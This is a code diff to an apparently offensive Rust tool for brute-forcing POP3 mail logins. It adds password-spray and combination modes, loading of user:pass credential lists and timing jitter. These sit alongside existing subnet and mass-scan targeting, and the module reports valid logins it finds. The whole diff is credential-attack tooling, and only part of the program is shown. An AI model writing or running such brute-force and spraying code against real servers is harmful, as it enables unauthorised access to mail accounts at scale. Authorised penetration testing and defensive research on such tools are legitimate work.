@@ -6,11 +6,12 @@ use std::time::Duration;
 
 use crate::utils::{
     load_lines,
-    cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
+    cfg_prompt_default, cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
 };
 use crate::modules::creds::utils::{
     BruteforceConfig, LoginResult, SubnetScanConfig,
-    generate_combos, run_bruteforce, run_subnet_bruteforce,
+    generate_combos_mode, parse_combo_mode, load_credential_file,
+    run_bruteforce, run_subnet_bruteforce,
     is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
     backoff_delay,
 };
@@ -212,6 +213,7 @@ pub async fn run(target: &str) -> Result<()> {
             verbose,
             output_file,
             service_name: "pop3",
+            jitter_ms: 0,
             source_module: "creds/generic/pop3_bruteforce",
             skip_tcp_check: false,
         }, move |ip: IpAddr, port: u16, user: String, pass: String| {
@@ -248,7 +250,7 @@ pub async fn run(target: &str) -> Result<()> {
     let delay_ms = cfg_prompt_int_range("delay_ms", "Delay (ms)", 50, 0, 10000).await? as u64;
     let connection_timeout = cfg_prompt_int_range("timeout", "Timeout (s)", 5, 1, 60).await? as u64;
 
-    let full_combo = cfg_prompt_yes_no("combo_mode", "Try every username with every password?", false).await?;
+    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;
     let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", false).await?;
 
     let output_file = cfg_prompt_output_file("output_file", "Output file for results", "pop3_results.txt").await?;
@@ -269,7 +271,11 @@ pub async fn run(target: &str) -> Result<()> {
 
     crate::mprintln!("[*] Loaded {} usernames, {} passwords", usernames.len(), passwords.len());
 
-    let combos = generate_combos(&usernames, &passwords, full_combo);
+    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
+    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
+        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
+        combos.extend(load_credential_file(&cred_path)?);
+    }
 
     crate::mprintln!();
     crate::mprintln!("{}", "[Starting Attack]".bold().yellow());
@@ -304,6 +310,7 @@ pub async fn run(target: &str) -> Result<()> {
         delay_ms,
         max_retries,
         service_name: "pop3",
+        jitter_ms: 0,
         source_module: "creds/generic/pop3_bruteforce",
     }, combos, try_login).await?;
 
@@ -334,7 +341,7 @@ fn pop3_authenticate(stream: &mut (impl std::io::Read + std::io::Write), user: &
     let n = stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
     if String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
         if let Err(e) = stream.write_all(b"QUIT\r\n") { crate::meprintln!("[!] POP3 QUIT write error: {}", e); }
-        if let Err(e) = stream.flush() { eprintln!("[!] Flush error: {}", e); }
+        if let Err(e) = stream.flush() { crate::meprintln!("[!] Flush error: {}", e); }
         return Ok(true);
     }
 
